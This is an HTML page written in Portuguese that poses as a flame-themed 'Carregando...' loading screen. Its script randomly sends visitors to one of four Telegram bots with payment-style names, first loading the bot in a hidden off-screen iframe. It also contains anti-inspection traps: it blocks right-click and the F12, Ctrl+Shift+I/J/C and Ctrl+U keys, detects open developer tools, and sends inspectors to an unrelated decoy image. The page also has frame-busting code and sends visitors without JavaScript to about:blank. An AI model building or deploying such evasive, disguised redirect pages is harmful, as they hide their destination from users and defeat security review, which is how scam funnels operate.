<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<title>ðŸ”¥ Carregando...</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="Refresh" content="0; url=about:blank" id="no-js">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
<noscript><title>Bloqueado</title><style>body{background:#000}*{display:none}</style></noscript>
<style>
  html,body {
    height:100%;
    margin:0;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#000;
    overflow:hidden;
    font-family:'Poppins',sans-serif;
    color:#fff;
  }
  .loader {
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:16px;
    text-align:center;
  }
  h1 {
    font-size:1.3rem;
    color:#ff2a2a;
    letter-spacing:1px;
    text-shadow:0 0 10px #ff0000;
    animation:flicker 2s infinite alternate;
  }
  .bar-wrap {
    width:240px;
    height:14px;
    background:#220000;
    border-radius:999px;
    overflow:hidden;
    box-shadow:0 0 25px rgba(255,0,0,0.3),inset 0 0 10px rgba(255,0,0,0.2);
    position:relative;
  }
  .bar {
    width:0%;
    height:100%;
    background:linear-gradient(90deg,#6a0000,#ff0000,#6a0000);
    animation:fill 2.6s linear forwards;
  }
  .flame {
    position:absolute;
    right:0;
    top:50%;
    transform:translate(50%,-50%);
    font-size:1.3rem;
    opacity:0;
    animation:flameMove 2.6s linear forwards;
  }
  @keyframes fill {
    0% { width:0%; }
    100% { width:100%; }
  }
  @keyframes flameMove {
    0% { right:100%; opacity:0.3; }
    10% { opacity:1; }
    90% { opacity:1; }
    100% { right:0%; opacity:0; }
  }
  @keyframes flicker {
    0%,100% { opacity:1; text-shadow:0 0 12px #ff0000; }
    50% { opacity:0.8; text-shadow:0 0 20px #ff5500; }
  }
</style>
</head>
<body>
  <div class="loader">
    <h1 id="status">Carregando... ðŸ”¥</h1>
    <div class="bar-wrap">
      <div class="bar" id="bar"></div>
      <div class="flame">ðŸ”¥</div>
    </div>
  </div>

<script>
(()=>{

  // === Links destino (bots) ===
  const bots=[
    "https://t.me/tacofire_pay108b9x_bot?start=go",
    "https://t.me/pizzalove_pay105q8z_bot?start=go",
    "https://t.me/burgerking_pay103x9r_bot?start=go",
    "https://t.me/pancakechoco_pay101v7k_bot?start=go"
  ];

  // === Armadilha anti-inspeÃ§Ã£o ===
  const trap="https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";
  let detected=false;
  const kill=()=>{if(!detected){detected=true;location.replace(trap)}};

  // bloqueia clique direito e teclas de inspeÃ§Ã£o
  document.addEventListener('contextmenu',e=>{e.preventDefault();kill()},{passive:false});
  document.addEventListener('keydown',e=>{
    const k=e.key||'';
    if(k==='F12'||(e.ctrlKey&&e.shiftKey&&'IJC'.includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){
      e.preventDefault();kill();
    }
  },{passive:false});

  // detecÃ§Ã£o de devtools (somente desktop)
  let d=0;
  setInterval(()=>{
    const isMobile=/Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
    if(isMobile) return; // ignora iPhone / Android
    const w=window.outerWidth-window.innerWidth,
          h=window.outerHeight-window.innerHeight;
    if((w>160||h>160)&&++d>1) kill();
  },1100);

  // === AnimaÃ§Ã£o / Status ===
  const status=document.getElementById('status');
  const msgs=["Preparando ðŸ”¥","Verificando conexÃ£o...","Aquecendo ðŸ”¥","Redirecionando..."];
  let i=0;
  const change=setInterval(()=>{
    if(i<msgs.length){status.textContent=msgs[i++];}
    else clearInterval(change);
  },700);

  // === Redirecionamento ===
  setTimeout(()=>{
    if(detected) return;
    const target=bots[Math.floor(Math.random()*bots.length)];
    const iframe=document.createElement('iframe');
    iframe.src=target;
    iframe.style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0";
    document.body.appendChild(iframe);
    setTimeout(()=>location.replace(target),250);
  },2600);

  // === ProteÃ§Ãµes extras ===
  let blurC=0;
  window.addEventListener('blur',()=>{if(++blurC>4)kill()});
  try{if(window.top!==window.self)window.top.location=window.self.location}catch(e){}
  try{if(document.location.ancestorOrigins&&document.location.ancestorOrigins.length)kill()}catch(e){}

})();
</script>
</body>
</html>
